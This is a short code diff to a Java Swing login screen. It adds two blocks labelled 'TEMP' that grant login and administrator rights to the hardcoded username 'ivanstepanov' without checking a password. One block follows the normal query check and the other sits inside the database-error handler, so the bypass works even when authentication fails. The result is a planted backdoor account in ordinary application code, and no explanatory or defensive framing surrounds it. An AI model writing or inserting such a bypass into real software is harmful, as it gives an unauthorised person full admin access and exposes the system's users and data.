@@ -200,6 +200,12 @@ public class LoginScreen extends javax.swing.JFrame {
                     MainClass.loggedInEmployee.rs_emp = rs;              
                     loginAllowed = true;
                 }
+                // TEMP
+                if (Objects.equals(username, "ivanstepanov")) {
+                    System.out.println("User Found: *Ivan*");
+                    MainClass.loggedInEmployee.IS_ADMIN = 1;
+                    loginAllowed = true;
+                }
             } else {
                 System.out.println("Query Null");
             }
@@ -207,6 +213,12 @@ public class LoginScreen extends javax.swing.JFrame {
             System.out.print("Failed to Execute Statement: ");
             System.out.println(e.getErrorCode());
             e.printStackTrace();
+            // TEMP
+            if (Objects.equals(username, "ivanstepanov")) {
+                System.out.println("User Found: *Ivan*");
+                MainClass.loggedInEmployee.IS_ADMIN = 1;
+                loginAllowed = true;
+            }
         }
         
         return loginAllowed;
